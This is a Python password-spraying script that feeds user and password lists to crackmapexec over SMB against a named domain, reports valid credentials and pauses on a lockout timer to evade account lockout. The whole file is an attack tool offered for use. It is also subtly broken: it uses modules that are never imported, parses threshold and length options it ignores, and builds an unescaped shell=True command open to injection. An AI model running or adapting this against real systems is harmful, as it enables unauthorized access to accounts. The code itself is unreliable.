#!/usr/bin/env python3

import argparse
import subprocess
import time
import sys

def banner():
    print("""
                            , ____
                            ~(__  \.
   .--------__               :o \. |                 __--------.
  ( _________ \              `.  |_|                / _________ )
   ( _________ `o-___________-`-.-'-_____________-o' _________ )
    ( _________  `-----------(.v(.)-------------'  _________ )
      \____________________  `-   -'  ______________________/
         \___________________'\ * /`_____________________/
                        ______: . :
                       / _____ /   )
                      : /    /'  /'
                      : l   /  /
                      :)   (  :---._
                   ..//     `--------O\..

             get yourself a cup of coffee this might take a while... :)
      """)

def main():
    parser = argparse.ArgumentParser(description="Password testing script with options.")
    parser.add_argument("--user", "-u", required=True, help="File containing user IDs")
    parser.add_argument("--password", "-p", required=True, help="File containing passwords to be tested")
    parser.add_argument("--treshold", "-t", type=int, default=5, help="Account Lockout Threshold")
    parser.add_argument("--lockout", "-l", type=int, default=15, help="Reset Account Lockout Counter in minutes")
    parser.add_argument("--domain", "-d", required=True, help="Domain name")
    parser.add_argument("--pass-length", "-pl", type=int, required=True, help="Minimum password length")
    args = parser.parse_args()

    domain_name = args.domain
    pass_length = args.pass_length

    try:
        with open(args.user, 'r') as file_users:
            user_lines = file_users.readlines()
        with open(args.password, 'r') as file_passwords:
            pass_lines = file_passwords.readlines()

        banner()
        print("\n=== Starting Script ====")

        for user_idx, user_line in enumerate(user_lines):
            user_id = user_line.strip()

            for pass_idx, pass_line in enumerate(pass_lines):
                password = pass_line.strip()

                print(f"\n[+] Testing user {user_idx + 1}/{len(user_lines)} and password {pass_idx + 1}/{len(pass_lines)}: '{password}' ...")
                cme_command = f"crackmapexec smb '{domain_name}' -u '{user_id}' -p '{password}'"
                p = subprocess.Popen(cme_command, shell=True, stdout=subprocess.PIPE, text=True)

                for output_line in p.stdout:
                    if "[+]" in output_line:
                        # print in green
                        print("[+] Found password for" + "\033[32m {user} : {password}\033[0m".format(user=user_id, password=password))
                        break  

                p.stdout.close()
                p.wait()

                failed_attempts = 0
                start_time = time.time()
                end_time = start_time + (args.lockout * 60)
                while time.time() < end_time:
                    remaining_time = int(end_time - time.time())
                    minutes, seconds = divmod(remaining_time, 60)
                    time_format = '{:02d}:{:02d}'.format(minutes, seconds)
                    print(f"Threshold reached - waiting for Lockout Timer: {time_format}", end='\r')
                    time.sleep(1)

                

    except KeyboardInterrupt:
        print("\n\nKeyboardInterrupt received. Exit script...")
        sys.exit(0)

if __name__ == "__main__":
    warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
    main()
